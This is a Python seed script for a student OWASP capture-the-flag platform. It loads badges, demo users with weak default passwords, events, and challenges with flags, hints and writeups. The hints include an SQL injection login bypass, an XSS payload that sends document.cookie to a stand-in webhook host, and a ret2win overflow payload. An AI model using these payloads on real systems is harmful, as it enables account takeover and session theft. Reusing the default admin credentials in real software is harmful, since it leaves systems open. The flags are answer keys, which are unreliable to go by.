from datetime import datetime, timedelta
from database import Base, engine, SessionLocal
from models import (
    User,
    Event,
    Challenge,
    Submission,
    Badge,
    UserBadge,
    EventRegistration,
    ChallengeComment,
    Notification
)
from main import hash_password

Base.metadata.create_all(bind=engine)
db = SessionLocal()

print("Seeding database with OWASP CTF Platform data...")

# =========================================================
# BADGES
# =========================================================
badges_data = [
    {
        "name": "First Blood",
        "slug": "first_blood",
        "description": "Solved your very first challenge on the platform!",
        "icon": "FaTrophy",
        "category": "General",
        "criteria_desc": "Solve 1 challenge"
    },
    {
        "name": "Challenger V",
        "slug": "challenger_5",
        "description": "Mastered 5 challenges across any category.",
        "icon": "FaAward",
        "category": "General",
        "criteria_desc": "Solve 5 challenges"
    },
    {
        "name": "Flag Hoarder",
        "slug": "flag_hoarder",
        "description": "Captured 10 or more flags like a true hacker.",
        "icon": "FaFlag",
        "category": "General",
        "criteria_desc": "Solve 10 challenges"
    },
    {
        "name": "Century Club",
        "slug": "century_club",
        "description": "Accumulated 500+ points on the global leaderboard.",
        "icon": "FaMedal",
        "category": "Points",
        "criteria_desc": "Reach 500 points"
    },
    {
        "name": "Web Explorer",
        "slug": "web_explorer",
        "description": "Uncovered web application flaws and exploited them.",
        "icon": "FaGlobe",
        "category": "Web Exploitation",
        "criteria_desc": "Solve at least 1 Web challenge"
    },
    {
        "name": "Crypto Wizard",
        "slug": "crypto_wizard",
        "description": "Cracked ciphers and revealed hidden plaintexts.",
        "icon": "FaLock",
        "category": "Cryptography",
        "criteria_desc": "Solve at least 1 Crypto challenge"
    },
    {
        "name": "Forensic Detective",
        "slug": "forensic_detective",
        "description": "Carved packets and analyzed artifacts to find evidence.",
        "icon": "FaSearch",
        "category": "Forensics",
        "criteria_desc": "Solve at least 1 Forensics challenge"
    },
    {
        "name": "Binary Buster",
        "slug": "binary_buster",
        "description": "Disassembled and decompiled binaries like an engineer.",
        "icon": "FaCode",
        "category": "Reverse Engineering",
        "criteria_desc": "Solve at least 1 Reverse challenge"
    },
    {
        "name": "Pwn Master",
        "slug": "pwn_master",
        "description": "Hijacked control flow and achieved code execution.",
        "icon": "FaSkullCrossbones",
        "category": "Pwn/Binary Exploitation",
        "criteria_desc": "Solve at least 1 Pwn challenge"
    },
    {
        "name": "OSINT Sleuth",
        "slug": "osint_sleuth",
        "description": "Traced digital footprints and gathered open-source intel.",
        "icon": "FaUserSecret",
        "category": "OSINT",
        "criteria_desc": "Solve at least 1 OSINT challenge"
    }
]

created_badges = {}
for b in badges_data:
    badge = db.query(Badge).filter(Badge.slug == b["slug"]).first()
    if not badge:
        badge = Badge(**b)
        db.add(badge)
        db.commit()
        db.refresh(badge)
    created_badges[badge.slug] = badge

# =========================================================
# USERS
# =========================================================
users_data = [
    {
        "name": "OWASP Admin",
        "email": "admin@ctf.com",
        "password": "admin123",
        "role": "admin",
        "college": "PCCOE Pune",
        "bio": "Lead CTF Coordinator & OWASP Club President.",
        "github": "owasp-lead",
        "points": 0,
        "challenges_solved": 0
    },
    {
        "name": "CyberNinja",
        "email": "ninja@pccoe.edu",
        "password": "user123",
        "role": "user",
        "college": "PCCOE Pune",
        "bio": "Offensive security enthusiast & bug bounty hunter.",
        "github": "cyber-ninja",
        "points": 550,
        "challenges_solved": 4
    },
    {
        "name": "BinaryRaven",
        "email": "raven@coep.ac.in",
        "password": "user123",
        "role": "user",
        "college": "COEP Tech",
        "bio": "Pwn and Reverse Engineering researcher.",
        "github": "binary-raven",
        "points": 450,
        "challenges_solved": 3
    },
    {
        "name": "Alice_Crypto",
        "email": "alice@mitpune.edu",
        "password": "user123",
        "role": "user",
        "college": "MIT-WPU",
        "bio": "Mathematics & Modern Cryptography fanatic.",
        "github": "alice-crypto",
        "points": 350,
        "challenges_solved": 2
    },
    {
        "name": "Student Hacker",
        "email": "user@ctf.com",
        "password": "user123",
        "role": "user",
        "college": "PCCOE Pune",
        "bio": "Curious beginner diving into CTFs.",
        "github": "student-dev",
        "points": 100,
        "challenges_solved": 1
    }
]

created_users = {}
for u in users_data:
    user = db.query(User).filter(User.email == u["email"]).first()
    if not user:
        user = User(
            name=u["name"],
            email=u["email"],
            password_hash=hash_password(u["password"]),
            role=u["role"],
            college=u["college"],
            bio=u["bio"],
            github=u["github"],
            points=u["points"],
            challenges_solved=u["challenges_solved"],
            email_verified=True
        )
        db.add(user)
        db.commit()
        db.refresh(user)
    created_users[user.email] = user

# =========================================================
# EVENTS
# =========================================================
now = datetime.utcnow()
event1 = db.query(Event).filter(Event.name == "OWASP Inter-College CyberSprint 2026").first()
if not event1:
    event1 = Event(
        name="OWASP Inter-College CyberSprint 2026",
        description="The flagship annual 48-hour Jeopardy CTF hosted by the OWASP Student Chapter. Solve Web, Crypto, Forensics, and Pwn challenges to take your college to #1!",
        start_date=now - timedelta(hours=12),
        end_date=now + timedelta(hours=36),
        is_scoreboard_frozen=False
    )
    db.add(event1)
    db.commit()
    db.refresh(event1)

event2 = db.query(Event).filter(Event.name == "Beginner CTF Bootcamp: Spring 2026").first()
if not event2:
    event2 = Event(
        name="Beginner CTF Bootcamp: Spring 2026",
        description="A friendly beginner tournament designed for first-time security students. Guided hints and step-by-step learning.",
        start_date=now + timedelta(days=5),
        end_date=now + timedelta(days=7),
        is_scoreboard_frozen=False
    )
    db.add(event2)
    db.commit()
    db.refresh(event2)

# =========================================================
# CHALLENGES (All 8 Canonical Categories from Plan)
# =========================================================
challenges_data = [
    {
        "title": "Welcome to OWASP CTF",
        "description": "Welcome to the College OWASP CTF arena! Validate your setup by submitting this introductory flag.",
        "category": "Misc",
        "difficulty": "Easy",
        "points": 100,
        "flag": "OWASP{welcome_to_cyber_arena}",
        "hint": "Check the challenge title and welcome text closely!",
        "hint_cost": 10,
        "writeup": "This challenge tests your ability to read instructions and submit flags in standard format `OWASP{...}`.",
        "file_url": None,
        "connection_info": None,
        "event_id": event1.id
    },
    {
        "title": "SQLi Injection Portal",
        "description": "Our college portal's login form seems suspiciously vulnerable to classic authentication bypass. Can you log in as administrator without the password?",
        "category": "Web Exploitation",
        "difficulty": "Easy",
        "points": 150,
        "flag": "OWASP{sql_injection_bypass_master_732}",
        "hint": "Try `' OR '1'='1' --` in the username input box.",
        "hint_cost": 20,
        "writeup": "By injecting `' OR '1'='1' --` into the username field, the SQL query evaluates to true for the first record in the users table, logging you in as admin.",
        "file_url": None,
        "connection_info": "http://challenges.owasp.club:8081",
        "event_id": event1.id
    },
    {
        "title": "XSS Cookie Thief",
        "description": "A feedback box reflects raw user input without HTML sanitization. The admin regularly inspects the submissions with their browser.",
        "category": "Web Exploitation",
        "difficulty": "Medium",
        "points": 250,
        "flag": "OWASP{stored_xss_steals_admin_cookie}",
        "hint": "Craft a payload with `<script>fetch('http://your-webhook.com/?c=' + document.cookie)</script>`.",
        "hint_cost": 30,
        "writeup": "The guestbook page reflects unsanitized comments. Injecting a malicious JavaScript payload triggers when the headless bot visits the page, leaking the admin session cookie.",
        "file_url": None,
        "connection_info": "http://challenges.owasp.club:8082",
        "event_id": None
    },
    {
        "title": "Ancient Caesar's Secret",
        "description": "We intercepted this encrypted telegram from an ancient general: `RZDVS{fdhvdu_flskhu_lv_hdvb_wr_euhdn}`. Decrypt the message to obtain the flag.",
        "category": "Cryptography",
        "difficulty": "Easy",
        "points": 100,
        "flag": "OWASP{caesar_cipher_is_easy_to_break}",
        "hint": "ROT3 or ROT13? Shift letters backwards in the alphabet by 3 positions.",
        "hint_cost": 15,
        "writeup": "Using a Caesar shift of 3 backwards (ROT-3): R->O, Z->W, D->A, V->S, S->P gives `OWASP{caesar_cipher_is_easy_to_break}`.",
        "file_url": None,
        "connection_info": None,
        "event_id": event1.id
    },
    {
        "title": "RSA Common Modulus Flaw",
        "description": "Two messages were encrypted with the same RSA modulus `N` using different public exponents `e1` and `e2`. Can you recover the plaintext?",
        "category": "Cryptography",
        "difficulty": "Hard",
        "points": 350,
        "flag": "OWASP{rsa_common_modulus_bezout_identity}",
        "hint": "Use Extended Euclidean algorithm to find Bézout coefficients `a` and `b` such that `a*e1 + b*e2 = 1`.",
        "hint_cost": 40,
        "writeup": "When gcd(e1, e2) = 1, Bézout's identity gives a*e1 + b*e2 = 1. Computing c1^a * c2^b mod N yields the original plaintext message m.",
        "file_url": "https://raw.githubusercontent.com/owasp/ctf-files/main/rsa_chall.py",
        "connection_info": None,
        "event_id": None
    },
    {
        "title": "Corrupted PCAP Stream",
        "description": "Network traffic was captured during an unauthorized intrusion. Inspect the PCAP file to locate where the attacker exfiltrated credentials over plaintext HTTP.",
        "category": "Forensics",
        "difficulty": "Easy",
        "points": 150,
        "flag": "OWASP{wireshark_pcap_stream_found}",
        "hint": "Open with Wireshark, apply `http.request.method == 'POST'` filter, then Follow TCP Stream.",
        "hint_cost": 20,
        "writeup": "Filtering for POST requests reveals an unencrypted submission to `/api/login` containing the flag in the POST body parameter.",
        "file_url": "https://raw.githubusercontent.com/owasp/ctf-files/main/capture.pcap",
        "connection_info": None,
        "event_id": event1.id
    },
    {
        "title": "Memory Dump Mystery",
        "description": "A suspicious crash occurred on a Linux server. Use Volatility to inspect memory and recover the secret environment variable.",
        "category": "Forensics",
        "difficulty": "Medium",
        "points": 250,
        "flag": "OWASP{volatility_env_vars_carved}",
        "hint": "Run `vol.py -f mem.raw linux.envars` to inspect all process environment variables.",
        "hint_cost": 25,
        "writeup": "Analyzing the memory image with Volatility 3 `linux.envars` plugin exposes `FLAG=OWASP{volatility_env_vars_carved}` under PID 1420.",
        "file_url": "https://raw.githubusercontent.com/owasp/ctf-files/main/memory.dump.gz",
        "connection_info": None,
        "event_id": None
    },
    {
        "title": "Ghidra Keygen Crackme",
        "description": "This compiled 64-bit ELF binary requires a valid license key to execute. Decompile the binary to understand the verification algorithm.",
        "category": "Reverse Engineering",
        "difficulty": "Medium",
        "points": 250,
        "flag": "OWASP{ghidra_decompilation_success_99}",
        "hint": "Open in Ghidra or IDA Free. Look at `main` or `validate_license` function XORing each character with 0x5A.",
        "hint_cost": 30,
        "writeup": "Decompiling `validate_key` shows an array of bytes XORed with 0x5A. Writing a simple Python script to XOR the target array reproduces the valid flag.",
        "file_url": "https://raw.githubusercontent.com/owasp/ctf-files/main/crackme_linux",
        "connection_info": None,
        "event_id": event1.id
    },
    {
        "title": "Stack Buffer Overflow 101",
        "description": "The binary uses an unsafe `gets()` call into a 64-byte buffer without bounds checking. Overwrite the return address to jump to `win()` function.",
        "category": "Pwn/Binary Exploitation",
        "difficulty": "Medium",
        "points": 300,
        "flag": "OWASP{buffer_overflow_ret2win_pwned}",
        "hint": "Buffer is 64 bytes + 8 bytes saved RBP = 72 bytes offset. Append address of win().",
        "hint_cost": 35,
        "writeup": "Classic ret2win. Payload: `b'A'*72 + p64(win_addr)`. Sending this over the netcat connection spawns the shell and prints the flag.",
        "file_url": "https://raw.githubusercontent.com/owasp/ctf-files/main/bof101",
        "connection_info": "nc challenges.owasp.club 9001",
        "event_id": event1.id
    },
    {
        "title": "Target In Plain Sight",
        "description": "A rogue developer left a commit with sensitive tokens on a public repository before deleting it. Can you trace the git history and find the deleted flag?",
        "category": "OSINT",
        "difficulty": "Easy",
        "points": 100,
        "flag": "OWASP{git_commit_history_leaks_secrets}",
        "hint": "Check `git log --all --full-history` or look at GitHub commit diffs on the deleted branch.",
        "hint_cost": 15,
        "writeup": "Viewing the repository reflog or commit history reveals commit `e4f1a0` where `.env` was committed and later reverted.",
        "file_url": None,
        "connection_info": "https://github.com/owasp-club/dummy-project",
        "event_id": None
    },
    {
        "title": "Steganographic Audio Wave",
        "description": "A weird audio WAV file was discovered. Listening to it produces high-pitch noises. Look at it differently to read the hidden flag.",
        "category": "Steganography",
        "difficulty": "Easy",
        "points": 150,
        "flag": "OWASP{spectrogram_visual_audio_hidden}",
        "hint": "Open the audio file in Sonic Visualiser or Audacity and switch to Spectrogram view!",
        "hint_cost": 20,
        "writeup": "Switching Audacity display from Waveform to Spectrogram renders the text `OWASP{spectrogram_visual_audio_hidden}` directly in the frequency spectrum.",
        "file_url": "https://raw.githubusercontent.com/owasp/ctf-files/main/mystery.wav",
        "connection_info": None,
        "event_id": None
    }
]

created_challenges = []
for c in challenges_data:
    ch = db.query(Challenge).filter(Challenge.title == c["title"]).first()
    if not ch:
        ch = Challenge(**c)
        db.add(ch)
        db.commit()
        db.refresh(ch)
    created_challenges.append(ch)

# =========================================================
# SAMPLE SOLVES & BADGES FOR NINJA & STUDENT
# =========================================================
ninja = created_users.get("ninja@pccoe.edu")
student = created_users.get("user@ctf.com")

if ninja and created_challenges:
    # Solve 4 challenges
    for i in [0, 1, 3, 5]:
        ch = created_challenges[i]
        existing = db.query(Submission).filter(
            Submission.user_id == ninja.id,
            Submission.challenge_id == ch.id,
            Submission.is_correct == True
        ).first()
        if not existing:
            sub = Submission(
                user_id=ninja.id,
                challenge_id=ch.id,
                submitted_flag=ch.flag,
                is_correct=True,
                points_awarded=ch.points,
                submitted_at=datetime.utcnow() - timedelta(hours=2 * (i + 1))
            )
            db.add(sub)
            ch.solves_count += 1
            # Add a sample discussion comment
            comm = ChallengeComment(
                challenge_id=ch.id,
                user_id=ninja.id,
                content=f"Awesome challenge! Loved the approach for {ch.category}.",
                created_at=datetime.utcnow() - timedelta(hours=1)
            )
            db.add(comm)

    # Award badges to Ninja
    for b_slug in ["first_blood", "web_explorer", "crypto_wizard", "forensic_detective", "century_club"]:
        b = created_badges.get(b_slug)
        if b:
            ub = db.query(UserBadge).filter(UserBadge.user_id == ninja.id, UserBadge.badge_id == b.id).first()
            if not ub:
                db.add(UserBadge(user_id=ninja.id, badge_id=b.id, earned_at=datetime.utcnow() - timedelta(hours=3)))

if student and created_challenges:
    # Solve 1 challenge
    ch0 = created_challenges[0]
    existing = db.query(Submission).filter(
        Submission.user_id == student.id,
        Submission.challenge_id == ch0.id,
        Submission.is_correct == True
    ).first()
    if not existing:
        sub = Submission(
            user_id=student.id,
            challenge_id=ch0.id,
            submitted_flag=ch0.flag,
            is_correct=True,
            points_awarded=ch0.points,
            submitted_at=datetime.utcnow() - timedelta(hours=5)
        )
        db.add(sub)
        ch0.solves_count += 1

    fb = created_badges.get("first_blood")
    if fb:
        ub = db.query(UserBadge).filter(UserBadge.user_id == student.id, UserBadge.badge_id == fb.id).first()
        if not ub:
            db.add(UserBadge(user_id=student.id, badge_id=fb.id, earned_at=datetime.utcnow() - timedelta(hours=5)))

# =========================================================
# DEMO NOTIFICATIONS
# =========================================================
for u, title, message, kind in [
    (student, "Welcome to OWASP CTF Academy", "Your account is ready. Start with the Practice Arena or join the live CyberSprint.", "system"),
    (student, "Tournament registration confirmed", "You are registered for OWASP Inter-College CyberSprint 2026.", "event"),
    (ninja, "Flag captured", "You have active solved challenges in the arena. Keep climbing the leaderboard!", "solve"),
]:
    if u:
        exists = db.query(Notification).filter(Notification.user_id == u.id, Notification.title == title).first()
        if not exists:
            db.add(Notification(user_id=u.id, title=title, message=message, kind=kind, is_read=False))

# Register users for event1
if event1:
    for u in [ninja, student]:
        if u:
            reg = db.query(EventRegistration).filter(
                EventRegistration.event_id == event1.id,
                EventRegistration.user_id == u.id
            ).first()
            if not reg:
                db.add(EventRegistration(event_id=event1.id, user_id=u.id, registered_at=datetime.utcnow()))

db.commit()
db.close()

print("\nSeeding complete!")
print(f"Total Badges: {len(badges_data)}")
print(f"Total Challenges: {len(challenges_data)} across all 8 security categories")
print("Admin login: admin@ctf.com / admin123")
print("Student login: user@ctf.com / user123")
print("Ninja login: ninja@pccoe.edu / user123")